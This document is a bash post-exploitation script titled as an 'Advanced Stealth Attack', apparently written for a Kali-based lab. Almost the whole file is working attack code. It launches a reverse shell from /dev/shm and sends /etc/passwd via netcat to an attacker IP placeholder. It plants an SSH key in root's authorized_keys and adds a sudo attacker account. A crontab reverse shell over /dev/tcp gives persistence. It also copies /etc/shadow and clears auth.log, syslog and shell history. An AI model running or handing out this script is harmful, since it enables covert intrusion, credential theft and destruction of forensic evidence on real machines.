#!/bin/bash

echo "[🔥] Starting Advanced Stealth Attack..."

# 1. Execute pre-uploaded reverse shell payload from /dev/shm
echo "[*] Executing fileless reverse shell payload from /dev/shm"
nohup /dev/shm/shell.elf &

# 2. Exfiltrate sensitive data silently
echo "[*] Exfiltrating /etc/passwd"
tar czf - /etc/passwd | nc YOUR_KALI_IP 9999 &

# 3. Plant SSH backdoor
echo "[*] Installing SSH backdoor"
mkdir -p /root/.ssh
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# 4. Add stealthy attacker user
echo "[*] Creating hidden attacker user"
useradd attackeruser -m -s /bin/bash
# echo 'attackeruser:YourPassword' | chpasswd  
usermod -aG sudo attackeruser

# 5. Set up cronjob for persistent reverse shell
echo "[*] Installing reverse shell cronjob"
echo '* * * * * bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1' >> /etc/crontab

# 6. Simulate credential dump
echo "[*] Dumping shadow file for offline cracking simulation"
cp /etc/shadow /root/shadow_dump
chmod 600 /root/shadow_dump

# 7. Deploy in-memory hidden malicious script
echo "[*] Deploying hidden memory-resident script"
echo -e '#!/bin/bash\necho hacked > /tmp/.hiddenfile' > /dev/shm/.xhidden.sh
chmod +x /dev/shm/.xhidden.sh
nohup /dev/shm/.xhidden.sh &

# 8. Wipe logs and remove tool artifacts
echo "[*] Wiping logs and cleaning artifacts"
> ~/.bash_history && history -c
> /var/log/auth.log
> /var/log/syslog
rm -f /dev/shm/.xhidden.sh

echo "[✅] Stealth attack complete. Artifacts remain hidden unless forensics is thorough."
